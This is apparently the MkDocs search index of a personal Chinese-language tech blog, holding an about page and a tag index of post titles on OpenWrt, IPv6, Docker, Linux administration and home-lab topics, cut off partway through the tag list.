{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u535a\u5ba2","text":""},{"location":"about/","title":"\u5173\u4e8e","text":""},{"location":"about/#\u5173\u4e8e\u6211","title":"\u5173\u4e8e\u6211","text":"<p>\u6211\u672c\u79d1\u6bd5\u4e1a\u4e8e\u91cd\u5e86\u5927\u5b66\uff0817 \u7ea7\uff09\uff0c\u76ee\u524d\u4e8e\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u8bfb\u7814\uff0821 \u7ea7\uff09\uff0c\u65b9\u5411\u4e3a\u8ba1\u7b97\u673a\u7cfb\u7edf\u7ed3\u6784\u3002</p> <p>\u8054\u7cfb\u65b9\u5f0f</p> <ul> <li>\u6211\u7684 GitHub @TheRainstorm\u3002</li> <li>\u6211\u7684 Email yuanfuya@qq.com</li> <li>\u6211\u7684 B \u7ad9 @TheRainbowsea</li> </ul>"},{"location":"about/#\u535a\u5ba2\u7ec4\u7ec7","title":"\u535a\u5ba2\u7ec4\u7ec7","text":"<p>tag</p> <p>\u65b9\u4fbf\u641c\u7d22\u7528</p> <p>category</p> <p>\u751f\u6d3b\u65b9\u9762\uff08\u8ba1\u5212\u4ee5\u540e\u72ec\u7acb\u6210\u5355\u72ec\u53e6\u5916\u4e00\u4e2a\u535a\u5ba2\uff0c\u4f7f\u7528\u66f4\u504f\u751f\u6d3b\u5316\u7684\u4e3b\u9898\uff09</p> <ul> <li>\u4e2a\u4eba\uff1a\u5e74\u5ea6\u603b\u7ed3\u7b49\u504f\u751f\u6d3b\u5185\u5bb9</li> <li>\u9605\u8bfb\uff1a\u8bfb\u4e66\u7b14\u8bb0</li> <li>\u6e38\u620f\uff1a\u6e38\u620f\u8bc4\u6d4b\u5565\u7684</li> <li>\u8bfe\u7a0b\u7b14\u8bb0\uff1a\u4e0a\u5b66\u65f6\u7528\u7684</li> </ul> <p>\u504f\u6280\u672f\u7684\u8349\u7a3f\u3001\u7b14\u8bb0\u3001\u8bb0\u5f55</p> <ul> <li>\u5b66\u4e60\u7b14\u8bb0\uff1a\u6280\u672f\u65b9\u9762\u7684\u5b66\u4e60\u7b14\u8bb0</li> <li>\u8f6f\u4ef6\u5de5\u5177\uff1a\u4ece\u5c0f\u7684 linux \u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5230\u5355\u72ec\u7684\u8f6f\u4ef6\u670d\u52a1\uff08\u5982 jellyfin, immich\uff09\uff0c\u518d\u5230 docker, PVE \u7cfb\u7edf\u7ea7\u8f6f\u4ef6\u3002</li> <li>\u6298\u817e\u8bb0\u5f55\uff1a\u8bb0\u5f55\"do something\"\u7684\u8fc7\u7a0b\uff0c\u53ef\u80fd\u504f\u8349\u7a3f\u3002</li> </ul> <p>\u535a\u5ba2\uff08\u603b\u7ed3\u540e\u7684\u77e5\u8bc6\u8f93\u51fa\uff09</p> <ul> <li>\u535a\u5ba2\uff1a\u6ca1\u6709\u5206\u7c7b\u7684\u5185\u5bb9</li> <li>\u7f51\u7edc\uff1a\u7f51\u7edc\u76f8\u5173\u7684\u5185\u5bb9</li> <li>\u6570\u5b66\uff1a\u6570\u5b66\u76f8\u5173\u7684\u5185\u5bb9</li> </ul> <p>series</p> <p>\u6316\u5751\u7528\uff0c\u56f4\u7ed5\u4e00\u4e2a\u65b9\u9762\u5199\u4e00\u7cfb\u5217\u5185\u5bb9\u3002\u5982 Openwrt \u7cfb\u5217\uff0cHome Lab \u7cfb\u5217\u3002</p>"},{"location":"series/","title":"\u7cfb\u5217","text":"<p>#\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531</p> <p>#HomeLab \u5305\u542b\uff1a\u8bbe\u5907\uff0c\u7f51\u7edc\uff0c\u670d\u52a1\uff0c\u865a\u62df\u5316\u3002</p> <ul> <li>Openwrt \u4ece\u5165\u95e8\u5230\u653e\u5f03</li> <li>\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531\uff08\u4f7f\u7528\u7f51\u7edc\u6280\u672f\u4fbf\u5229\u751f\u6d3b\uff09<ul> <li>\u6587\u4ef6\u5171\u4eab\uff08\u5982 SMB\uff09</li> <li>\u8fdc\u7a0b\u684c\u9762</li> <li>\u6e38\u620f\u4e32\u6d41</li> <li>\u6587\u4ef6\u540c\u6b65</li> <li>\u76f8\u518c\u5907\u4efd\u540c\u6b65</li> </ul> </li> <li>Home Lab\uff08\u8bbe\u5907\u3001\u7f51\u7edc\u3001\u670d\u52a1\uff09\uff1a\u7f51\u7edc\u548c\u670d\u52a1\u4e0a\u9762\u4e24\u4e2a\u7cfb\u5217\u5df2\u7ecf\u6d89\u53ca\u8bb8\u591a\u4e86\uff0c\u6b64\u7cfb\u5217\u662f\u8fdb\u4e00\u6b65\u8865\u5145\u3002<ul> <li>PVE \u865a\u62df\u5316\u57fa\u7840\u8bbe\u65bd</li> <li>VPN \u7ec4\u7f51</li> </ul> </li> </ul>"},{"location":"tags/","title":"\u6807\u7b7e","text":""},{"location":"tags/#tag:asc","title":"ASC","text":"<ul> <li>            Vacation routine: ASC2020 tips (up to 02/09)          </li> </ul>"},{"location":"tags/#tag:c","title":"C","text":"<ul> <li>            C \u7f16\u7a0b\u98ce\u683c\u89c4\u8303          </li> <li>            C&amp;C++          </li> </ul>"},{"location":"tags/#tag:c","title":"C++","text":"<ul> <li>            C&amp;C++          </li> </ul>"},{"location":"tags/#tag:ca","title":"CA","text":"<ul> <li>            linux \u76f8\u5173-\u7cfb\u7edf\u8fd0\u7ef4          </li> </ul>"},{"location":"tags/#tag:cdn","title":"CDN","text":"<ul> <li>            L3 \u8d1f\u8f7d\u5747\u8861\u5b9e\u73b0\u7f51\u901f\u53e0\u52a0          </li> </ul>"},{"location":"tags/#tag:ci","title":"CI","text":"<ul> <li>            github action \u7f16\u8bd1 openwrt          </li> </ul>"},{"location":"tags/#tag:ecmp","title":"ECMP","text":"<ul> <li>            L3 \u8d1f\u8f7d\u5747\u8861\u5b9e\u73b0\u7f51\u901f\u53e0\u52a0          </li> </ul>"},{"location":"tags/#tag:eeprom","title":"EEPROM","text":"<ul> <li>            \u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b          </li> </ul>"},{"location":"tags/#tag:gre","title":"GRE","text":"<ul> <li>            MTU \u7684\u90a3\u4e9b\u5751(\u4e8c\u5c42\u96a7\u9053\u7ec4\u7f51)          </li> </ul>"},{"location":"tags/#tag:kvm","title":"KVM","text":"<ul> <li>            libvirt          </li> <li>            \u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212          </li> <li>            \u6361\u5783\u573e-rk3399 DIY KVM          </li> </ul>"},{"location":"tags/#tag:lxd","title":"LXD","text":"<ul> <li>            \u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212          </li> </ul>"},{"location":"tags/#tag:mss","title":"MSS","text":"<ul> <li>            MTU \u7684\u90a3\u4e9b\u5751(\u4e8c\u5c42\u96a7\u9053\u7ec4\u7f51)          </li> </ul>"},{"location":"tags/#tag:mtu","title":"MTU","text":"<ul> <li>            MTU \u7684\u90a3\u4e9b\u5751(\u4e8c\u5c42\u96a7\u9053\u7ec4\u7f51)          </li> </ul>"},{"location":"tags/#tag:ndp","title":"NDP","text":"<ul> <li>            IPv6 \u77e5\u8bc6\u548c  openwrt relay \u6a21\u5f0f\u7684\u5751          </li> </ul>"},{"location":"tags/#tag:nhk","title":"NHK","text":"<ul> <li>            \u770b\u5965\u8fd0\u4f1a\u7684\u5404\u79cd\u59ff\u52bf          </li> </ul>"},{"location":"tags/#tag:pd","title":"PD","text":"<ul> <li>            IPv6 \u77e5\u8bc6\u548c  openwrt relay \u6a21\u5f0f\u7684\u5751          </li> </ul>"},{"location":"tags/#tag:pmtud","title":"PMTUD","text":"<ul> <li>            MTU \u7684\u90a3\u4e9b\u5751(\u4e8c\u5c42\u96a7\u9053\u7ec4\u7f51)          </li> </ul>"},{"location":"tags/#tag:smb","title":"SMB","text":"<ul> <li>            windows \u76f8\u5173          </li> </ul>"},{"location":"tags/#tag:vipt","title":"VIPT","text":"<ul> <li>            \u518d\u6b21\u7406\u89e3 Cache \u8bbe\u8ba1          </li> </ul>"},{"location":"tags/#tag:x11","title":"X11","text":"<ul> <li>            vnc \u548c rdp \u8fdc\u7a0b          </li> </ul>"},{"location":"tags/#tag:ac2100","title":"ac2100","text":"<ul> <li>            \u8bb0\u5f55\u7ea2\u7c73 AC2100 \u6298\u817e          </li> </ul>"},{"location":"tags/#tag:apt","title":"apt","text":"<ul> <li>            linux \u76f8\u5173-\u7cfb\u7edf\u8fd0\u7ef4          </li> </ul>"},{"location":"tags/#tag:aria2c","title":"aria2c","text":"<ul> <li>            L3 \u8d1f\u8f7d\u5747\u8861\u5b9e\u73b0\u7f51\u901f\u53e0\u52a0          </li> </ul>"},{"location":"tags/#tag:armbian","title":"armbian","text":"<ul> <li>            \u6361\u5783\u573e-rk3399 DIY KVM          </li> </ul>"},{"location":"tags/#tag:arp","title":"arp","text":"<ul> <li>            NAS \u65e0\u6cd5\u626b\u63cf\u5230\u6d89\u53ca\u7684\u7f51\u7edc\u77e5\u8bc6          </li> </ul>"},{"location":"tags/#tag:awk","title":"awk","text":"<ul> <li>            linux \u76f8\u5173-\u57fa\u672c\u547d\u4ee4          </li> </ul>"},{"location":"tags/#tag:bad-apple","title":"bad-apple","text":"<ul> <li>            CloudView \u5e73\u53f0\u8fd0\u884c bad apple          </li> </ul>"},{"location":"tags/#tag:bash","title":"bash","text":"<ul> <li>            bash          </li> </ul>"},{"location":"tags/#tag:breed","title":"breed","text":"<ul> <li>            \u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b          </li> </ul>"},{"location":"tags/#tag:bridge","title":"bridge","text":"<ul> <li>            VLAN \u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531          </li> </ul>"},{"location":"tags/#tag:cache","title":"cache","text":"<ul> <li>            \u518d\u6b21\u7406\u89e3 Cache \u8bbe\u8ba1          </li> </ul>"},{"location":"tags/#tag:centos","title":"centos","text":"<ul> <li>            \u5b89\u88c5 centos \u865a\u62df\u673a\u4ee5\u53ca\u914d\u7f6e gameboy.live \u8bb0\u5f55          </li> </ul>"},{"location":"tags/#tag:cloudfare","title":"cloudfare","text":"<ul> <li>            hexo \u8fc1\u79fb\u5230 mkdoc          </li> </ul>"},{"location":"tags/#tag:cloudview","title":"cloudview","text":"<ul> <li>            CloudView \u5e73\u53f0\u8fd0\u884c bad apple          </li> </ul>"},{"location":"tags/#tag:cpp","title":"cpp","text":"<ul> <li>            Use dlib in C++          </li> </ul>"},{"location":"tags/#tag:cpu","title":"cpu","text":"<ul> <li>            \u518d\u6b21\u7406\u89e3 Cache \u8bbe\u8ba1          </li> </ul>"},{"location":"tags/#tag:cuda","title":"cuda","text":"<ul> <li>            CUDA \u4f18\u5316          </li> <li>            CUDA \u67b6\u6784          </li> <li>            CUDA \u7f16\u7a0b&amp;\u5de5\u5177          </li> </ul>"},{"location":"tags/#tag:dhcpv6","title":"dhcpv6","text":"<ul> <li>            IPv6 \u77e5\u8bc6\u548c  openwrt relay \u6a21\u5f0f\u7684\u5751          </li> </ul>"},{"location":"tags/#tag:dig","title":"dig","text":"<ul> <li>            linux \u76f8\u5173-\u7cfb\u7edf\u8fd0\u7ef4          </li> </ul>"},{"location":"tags/#tag:div10","title":"div10","text":"<ul> <li>            \u4f7f\u7528\u6574\u6570\u4f4d\u8fd0\u7b97\u8ba1\u7b97 div10          </li> </ul>"},{"location":"tags/#tag:dlib","title":"dlib","text":"<ul> <li>            Use dlib in C++          </li> </ul>"},{"location":"tags/#tag:dns","title":"dns","text":"<ul> <li>            openwrt DNS \u8be6\u89e3          </li> </ul>"},{"location":"tags/#tag:docker","title":"docker","text":"<ul> <li>            docker          </li> <li>            \u4f7f\u7528 docker \u914d\u7f6e hexo \u535a\u5ba2\u73af\u5883          </li> <li>            \u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212          </li> <li>            \u670d\u52a1\u5668\u4e0a\u8fd0\u884cswitch\u6a21\u62df\u5668\uff08linux \u4e91\u6e38\u620f\uff09          </li> </ul>"},{"location":"tags/#tag:eleven","title":"eleven","text":"<ul> <li>            VR \u5bf9\u73b0\u5b9e\u7684\u5f71\u54cd          </li> </ul>"},{"location":"tags/#tag:fdisk","title":"fdisk","text":"<ul> <li>            linux \u76f8\u5173-\u7cfb\u7edf\u8fd0\u7ef4          </li> </ul>"},{"location":"tags/#tag:ffmpeg","title":"ffmpeg","text":"<ul> <li>            ffmpeg          </li> </ul>"},{"location":"tags/#tag:fio","title":"fio","text":"<ul> <li>            linux \u76f8\u5173-\u7cfb\u7edf\u8fd0\u7ef4          </li> </ul>"},{"location":"tags/#tag:flash-\u5206\u533a","title":"flash \u5206\u533a","text":"<ul> <li>            \u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b          </li> </ul>"},{"location":"tags/#tag:fragment","title":"fragment","text":"<ul> <li>            MTU \u7684\u90a3\u4e9b\u5751(\u4e8c\u5c42\u96a7\u9053\u7ec4\u7f51)          </li> </ul>"},{"location":"tags/#tag:fsck","title":"fsck","text":"<ul> <li>            \u8bb0\u4e00\u6b21 linux \u7cfb\u7edf\u65e0\u6cd5\u542f\u52a8\u4fee\u590d\u8fc7\u7a0b          </li> </ul>"},{"location":"tags/#tag:fstab","title":"fstab","text":"<ul> <li>            linux \u7cfb\u7edf\u8fc1\u79fb          </li> </ul>"},{"location":"tags/#tag:fzf","title":"fzf","text":"<ul> <li>            \u5b89\u88c5 linux \u540e\u7684\u914d\u7f6e          </li> </ul>"},{"location":"tags/#tag:gameboy","title":"gameboy","text":"<ul> <li>            \u5b89\u88c5 centos \u865a\u62df\u673a\u4ee5\u53ca\u914d\u7f6e gameboy.live \u8bb0\u5f55          </li> </ul>"},{"location":"tags/#tag:gaming","title":"gaming","text":"<ul> <li>            \u670d\u52a1\u5668\u4e0a\u8fd0\u884cswitch\u6a21\u62df\u5668\uff08linux \u4e91\u6e38\u620f\uff09          </li> </ul>"},{"location":"tags/#tag:gcc","title":"gcc","text":"<ul> <li>            Linux \u5b89\u88c5 windows \u865a\u62df\u673a\u5e76\u663e\u5361\u76f4\u901a          </li> <li>            gcc mpi \u6e90\u7801\u7f16\u8bd1          </li> </ul>"},{"location":"tags/#tag:git","title":"git","text":"<ul> <li>            git          </li> </ul>"},{"location":"tags/#tag:github-action","title":"github-action","text":"<ul> <li>            github action \u7f16\u8bd1 openwrt          </li> </ul>"},{"location":"tags/#tag:glinet","title":"glinet","text":"<ul> <li>            \u4fbf\u643a\u8def\u7531\u5668          </li> </ul>"},{"location":"tags/#tag:gow","title":"gow","text":"<ul> <li>            \u670d\u52a1\u5668\u4e0a\u8fd0\u884cswitch\u6a21\u62df\u5668\uff08linux \u4e91\u6e38\u620f\uff09          </li> </ul>"},{"location":"tags/#tag:grub","title":"grub","text":"<ul> <li>            linux \u7cfb\u7edf\u8fc1\u79fb          </li> <li>            \u8bb0\u4e00\u6b21 linux \u7cfb\u7edf\u65e0\u6cd5\u542f\u52a8\u4fee\u590d\u8fc7\u7a0b          </li> </ul>"},{"location":"tags/#tag:hexo","title":"hexo","text":"<ul> <li>            hexo \u4f7f\u7528          </li> <li>            hexo \u8fc1\u79fb\u5230 mkdoc          </li> <li>            write blog in PC through sshing to a mobile phone          </li> <li>            \u4f7f\u7528 docker \u914d\u7f6e hexo \u535a\u5ba2\u73af\u5883          </li> </ul>"},{"location":"tags/#tag:hls","title":"hls","text":"<ul> <li>            VR \u591a\u4eba\u89c2\u5f71          </li> </ul>"},{"location":"tags/#tag:hpl","title":"hpl","text":"<ul> <li>            HPL complie          </li> </ul>"},{"location":"tags/#tag:http","title":"http","text":"<ul> <li>            linux \u521b\u5efa\u4ee3\u7406          </li> </ul>"},{"location":"tags/#tag:immortalwrt","title":"immortalwrt","text":"<ul> <li>            \u5c1d\u8bd5\u975e\u5b98\u65b9 openwrt          </li> </ul>"},{"location":"tags/#tag:ip-rule","title":"ip-rule","text":"<ul> <li>            Wireguard \u7ec4\u7f51          </li> </ul>"},{"location":"tags/#tag:iptables","title":"iptables","text":"<ul> <li>            Wireguard \u7ec4\u7f51          </li> <li>            iptables          </li> </ul>"},{"location":"tags/#tag:ipv6","title":"ipv6","text":"<ul> <li>            IPv6 \u77e5\u8bc6\u548c  openwrt relay \u6a21\u5f0f\u7684\u5751          </li> <li>            openwrt DNS \u8be6\u89e3          </li> <li>            \u4e3a\u8bbe\u5907\u5206\u914d\u9759\u6001 v6 \u57fa\u4e8e ndppd          </li> <li>            \u4f53\u9a8c\u7eaf IPv6 \u7f51\u7edc          </li> <li>            \u79fb\u52a8\u5149\u732b\u5f00\u542f ipv6          </li> </ul>"},{"location":"tags/#tag:iscsi","title":"iscsi","text":"<ul> <li>            \u7f51\u7edc\u6302\u8f7d\u78c1\u76d8 (iSCSi)          </li> </ul>"},{"location":"tags/#tag:iw","title":"iw","text":"<ul> <li>            L3 \u8d1f\u8f7d\u5747\u8861\u5b9e\u73b0\u7f51\u901f\u53e0\u52a0          </li> </ul>"},{"location":"tags/#tag:iwd","title":"iwd","text":"<ul> <li>            linux \u76f8\u5173-\u7cfb\u7edf\u8fd0\u7ef4          </li> </ul>"},{"location":"tags/#tag:jcg_q30","title":"jcg_q30","text":"<ul> <li>            \u4fbf\u643a\u8def\u7531\u5668          </li> </ul>"},{"location":"tags/#tag:jellyfin","title":"jellyfin","text":"<ul> <li>            jellyfin \u76f8\u5173          </li> </ul>"},{"location":"tags/#tag:journalctl","title":"journalctl","text":"<ul> <li>            linux \u76f8\u5173-\u7cfb\u7edf\u8fd0\u7ef4          </li> </ul>"},{"location":"tags/#tag:kernel","title":"kernel","text":"<ul> <li>            linux \u5185\u6838\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\u9605\u8bfb          </li> </ul>"},{"location":"tags/#tag:latex","title":"latex","text":"<ul> <li>            latex          </li> </ul>"},{"location":"tags/#tag:ldap","title":"ldap","text":"<ul> <li>            linux \u76f8\u5173-\u7cfb\u7edf\u8fd0\u7ef4          </li> </ul>"},{"location":"tags/#tag:libvirt","title":"libvirt","text":"<ul> <li>            libvirt          </li> </ul>"},{"location":"tags/#tag:linux","title":"linux","text":"<ul> <li>            linux \u5185\u6838\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\u9605\u8bfb          </li> <li>            linux \u521b\u5efa\u4ee3\u7406          </li> <li>            \u5b89\u88c5 linux \u540e\u7684\u914d\u7f6e          </li> <li>            \u670d\u52a1\u5668\u4e0a\u8fd0\u884cswitch\u6a21\u62df\u5668\uff08linux \u4e91\u6e38\u620f\uff09          </li> <li>            \u8bb0\u4e00\u6b21 linux \u7cfb\u7edf\u65e0\u6cd5\u542f\u52a8\u4fee\u590d\u8fc7\u7a0b          </li> </ul>"},{"location":"tags/#tag:linuxdeploy","title":"linuxdeploy","text":"<ul> <li>            \u5b89\u5353\u5237\u673a\u5e76\u5b89\u88c5 linux          </li> </ul>"},{"location":"tags/#tag:lxc","title":"lxc","text":"<ul> <li>            LXC \u4f7f\u7528          </li> </ul>"},{"location":"tags/#tag:lxd","title":"lxd","text":"<ul> <li>            LXC \u4f7f\u7528          </li> </ul>"},{"location":"tags/#tag:m2-\u63a5\u53e3","title":"m2 \u63a5\u53e3","text":"<ul> <li>            \u66f4\u65b0\u56fa\u6001\u4e4b\u65c5          </li> </ul>"},{"location":"tags/#tag:macvlan","title":"macvlan","text":"<ul> <li>            L3 \u8d1f\u8f7d\u5747\u8861\u5b9e\u73b0\u7f51\u901f\u53e0\u52a0          </li> </ul>"},{"location":"tags/#tag:markdownlint-cli","title":"markdownlint-cli","text":"<ul> <li>            hexo \u8fc1\u79fb\u5230 mkdoc          </li> </ul>"},{"location":"tags/#tag:math","title":"math","text":"<ul> <li>            \u5177\u4f53\u6570\u5b66          </li> </ul>"},{"location":"tags/#tag:mesh","title":"mesh","text":"<ul> <li>            Openwrt Mesh \u548c\u5feb\u901f\u6f2b\u6e38\u914d\u7f6e          </li> </ul>"},{"location":"tags/#tag:mips","title":"mips","text":"<ul> <li>            mips \u975e\u5bf9\u9f50\u6307\u4ee4\u4e0e\u5927\u5c0f\u7aef          </li> <li>            ucore-mips \u4ee3\u7801\u5206\u6790          </li> </ul>"},{"location":"tags/#tag:mkdocs","title":"mkdocs","text":"<ul> <li>            hexo \u8fc1\u79fb\u5230 mkdoc          </li> </ul>"},{"location":"tags/#tag:moonlight","title":"moonlight","text":"<ul> <li>            \u4f7f\u7528\u5176\u5b83\u8bbe\u5907\u4f5c\u4e3a\u6269\u5c55\u5c4f\u5e55          </li> </ul>"},{"location":"tags/#tag:mount","title":"mount","text":"<ul> <li>            linux \u76f8\u5173-\u7cfb\u7edf\u8fd0\u7ef4          </li> </ul>"},{"location":"tags/#tag:mpi","title":"mpi","text":"<ul> <li>            Linux \u5b89\u88c5 windows \u865a\u62df\u673a\u5e76\u663e\u5361\u76f4\u901a          </li> <li>            gcc mpi \u6e90\u7801\u7f16\u8bd1          </li> </ul>"},{"location":"tags/#tag:ndppd","title":"ndppd","text":"<ul> <li>            \u4e3a\u8bbe\u5907\u5206\u914d\u9759\u6001 v6 \u57fa\u4e8e ndppd          </li> </ul>"},{"location":"tags/#tag:nginx","title":"nginx","text":"<ul> <li>            L3 \u8d1f\u8f7d\u5747\u8861\u5b9e\u73b0\u7f51\u901f\u53e0\u52a0          </li> </ul>"},{"location":"tags/#tag:nmcli","title":"nmcli","text":"<ul> <li>            linux \u76f8\u5173-\u7cfb\u7edf\u8fd0\u7ef4          </li> </ul>"},{"location":"tags/#tag:novnc","title":"noVNC","text":"<ul> <li>            vnc \u548c rdp \u8fdc\u7a0b          </li> </ul>"},{"location":"tags/#tag:ntfs","title":"ntfs","text":"<ul> <li>            \u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212          </li> </ul>"},{"location":"tags/#tag:obsidian","title":"obsidian","text":"<ul> <li>            hexo \u8fc1\u79fb\u5230 mkdoc          </li> </ul>"},{"location":"tags/#tag:olympics","title":"olympics","text":"<ul> <li>            \u770b\u5965\u8fd0\u4f1a\u7684\u5404\u79cd\u59ff\u52bf          </li> </ul>"},{"location":"tags/#tag:opencv","title":"opencv","text":"<ul> <li>            \u5b89\u88c5\u4f7f\u7528 OpenCV(windows)          </li> </ul>"},{"location":"tags/#tag:openwrt","title":"openwrt","text":"<ul> <li>            Openwrt Mesh \u548c\u5feb\u901f\u6f2b\u6e38\u914d\u7f6e          </li> <li>            Openwrt \u6298\u817e          </li> <li>            VLAN \u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531          </li> <li>            Wireguard \u7ec4\u7f51          </li> <li>            github action \u7f16\u8bd1 openwrt          </li> <li>            openwrt DNS \u8be6\u89e3          </li> <li>            openwrt x86 \u5347\u7ea7          </li> <li>            openwrt \u5237\u673a          </li> <li>            openwrt \u7f16\u8bd1          </li> <li>            openwrt \u8def\u7531\u5668\u9009\u62e9          </li> <li>            openwrt \u914d\u7f6e          </li> <li>            \u4f7f\u7528 openwrt \u8def\u7531\u5668\u548c usb \u6444\u50cf\u5934\u8fdb\u884c\u5ef6\u65f6\u6444\u5f71          </li> <li>            \u4fbf\u643a\u8def\u7531\u5668          </li> <li>            \u5c1d\u8bd5\u975e\u5b98\u65b9 openwrt          </li> <li>            \u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b          </li> </ul>"},{"location":"tags/#tag:overleaf","title":"overleaf","text":"<ul> <li>            \u5728\u865a\u62df\u673a\u4e0a\u642d\u5efa overleaf          </li> </ul>"},{"location":"tags/#tag:paris","title":"paris","text":"<ul> <li>            \u770b\u5965\u8fd0\u4f1a\u7684\u5404\u79cd\u59ff\u52bf          </li> </ul>"},{"location":"tags/#tag:portainer","title":"portainer","text":"<ul> <li>            \u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212          </li> </ul>"},{"location":"tags/#tag:proxy","title":"proxy","text":"<ul> <li>            linux \u521b\u5efa\u4ee3\u7406          </li> </ul>"},{"location":"tags/#tag:pve","title":"pve","text":"<ul> <li>            PVE          </li> </ul>"},{"location":"tags/#tag:python","title":"python","text":"<ul> <li>            python \u6b63\u5219\u8868\u8fbe\u5f0f          </li> </ul>"},{"location":"tags/#tag:qemu","title":"qemu","text":"<ul> <li>            libvirt          </li> <li>            \u865a\u62df\u6e38\u620f\u623f          </li> </ul>"},{"location":"tags/#tag:raid10","title":"raid10","text":"<ul> <li>            \u53f0\u5f0f\u673a\u5347\u7ea7-\u786c\u4ef6\u7bc7          </li> </ul>"},{"location":"tags/#tag:rdp","title":"rdp","text":"<ul> <li>            vnc \u548c rdp \u8fdc\u7a0b          </li> </ul>"},{"location":"tags/#tag:re","title":"re","text":"<ul> <li>            python \u6b63\u5219\u8868\u8fbe\u5f0f          </li> </ul>"},{"location":"tags/#tag:relay","title":"relay","text":"<ul> <li>            IPv6 \u77e5\u8bc6\u548c  openwrt relay \u6a21\u5f0f\u7684\u5751          </li> </ul>"},{"location":"tags/#tag:retroarch","title":"retroarch","text":"<ul> <li>            \u590d\u53e4\u6a21\u62df\u5668\u524d\u7aef          </li> </ul>"},{"location":"tags/#tag:risc-v","title":"risc-v","text":"<ul> <li>            RISC-V trend          </li> </ul>"},{"location":"tags/#tag:rk3399","title":"rk3399","text":"<ul> <li>            \u6361\u5783\u573e-rk3399 DIY KVM          </li> </ul>"},{"location":"tags/#tag:rsync","title":"rsync","text":"<ul> <li>            linux \u7cfb\u7edf\u8fc1\u79fb          </li> </ul>"},{"location":"tags/#tag:samba","title":"samba","text":"<ul> <li>            \u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212          </li> </ul>"},{"location":"tags/#tag:sed","title":"sed","text":"<ul> <li>            linux \u76f8\u5173-\u57fa\u672c\u547d\u4ee4          </li> </ul>"},{"location":"tags/#tag:slaac","title":"slaac","text":"<ul> <li>            IPv6 \u77e5\u8bc6\u548c  openwrt relay \u6a21\u5f0f\u7684\u5751          </li> </ul>"},{"location":"tags/#tag:smartctl","title":"smartctl","text":"<ul> <li>            \u4e8c\u624b\u673a\u68b0\u786c\u76d8\u8d2d\u4e70          </li> </ul>"},{"location":"tags/#tag:socks","title":"socks","text":"<ul> <li>            linux \u521b\u5efa\u4ee3\u7406          </li> </ul>"},{"location":"tags/#tag:spacedesk","title":"spacedesk","text":"<ul> <li>            \u4f7f\u7528\u5176\u5b83\u8bbe\u5907\u4f5c\u4e3a\u6269\u5c55\u5c4f\u5e55          </li> </ul>"},{"location":"tags/#tag:style","title":"style","text":"<ul> <li>            C \u7f16\u7a0b\u98ce\u683c\u89c4\u8303          </li> </ul>"},{"location":"tags/#tag:sunshine","title":"sunshine","text":"<ul> <li>            \u4f7f\u7528\u5176\u5b83\u8bbe\u5907\u4f5c\u4e3a\u6269\u5c55\u5c4f\u5e55          </li> </ul>"},{"location":"tags/#tag:termux","title":"termux","text":"<ul> <li>            write blog in PC through sshing to a mobile phone          </li> </ul>"},{"location":"tags/#tag:tigervnc","title":"tigervnc","text":"<ul> <li>            vnc \u548c rdp \u8fdc\u7a0b          </li> </ul>"},{"location":"tags/#tag:tmux","title":"tmux","text":"<ul> <li>            tmux          </li> <li>            \u5b89\u88c5 linux \u540e\u7684\u914d\u7f6e          </li> </ul>"},{"location":"tags/#tag:tty","title":"tty","text":"<ul> <li>            linux \u76f8\u5173-linux \u4f7f\u7528          </li> </ul>"},{"location":"tags/#tag:ucore","title":"ucore","text":"<ul> <li>            ucore lab2 \u603b\u7ed3          </li> <li>            ucore lab3 \u603b\u7ed3          </li> <li>            ucore-mips \u4ee3\u7801\u5206\u6790          </li> </ul>"},{"location":"tags/#tag:usb-\u6444\u50cf\u5934","title":"usb \u6444\u50cf\u5934","text":"<ul> <li>            \u4f7f\u7528 openwrt \u8def\u7531\u5668\u548c usb \u6444\u50cf\u5934\u8fdb\u884c\u5ef6\u65f6\u6444\u5f71          </li> </ul>"},{"location":"tags/#tag:v4l2","title":"v4l2","text":"<ul> <li>            linux \u76f8\u5173-\u7cfb\u7edf\u8fd0\u7ef4          </li> </ul>"},{"location":"tags/#tag:vim","title":"vim","text":"<ul> <li>            linux \u76f8\u5173-\u57fa\u672c\u547d\u4ee4          </li> </ul>"},{"location":"tags/#tag:virsh","title":"virsh","text":"<ul> <li>            libvirt          </li> </ul>"},{"location":"tags/#tag:virtual-display","title":"virtual-display","text":"<ul> <li>            \u4f7f\u7528\u5176\u5b83\u8bbe\u5907\u4f5c\u4e3a\u6269\u5c55\u5c4f\u5e55          </li> </ul>"},{"location":"tags/#tag:virtualbox","title":"virtualbox","text":"<ul> <li>            Virtual Box \u914d\u7f6e\u53cc\u7f51\u5361          </li> </ul>"},{"location":"tags/#tag:vlan","title":"vlan","text":"<ul> <li>            VLAN \u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531          </li> </ul>"},{"location":"tags/#tag:vnc","title":"vnc","text":"<ul> <li>            vnc \u548c rdp \u8fdc\u7a0b          </li> <li>            \u5b89\u88c5 linux \u540e\u7684\u914d\u7f6e          </li> </ul>"},{"location":"tags/#tag:vr","title":"vr","text":"<ul> <li>            VR \u591a\u4eba\u89c2\u5f71          </li> <li>            VR 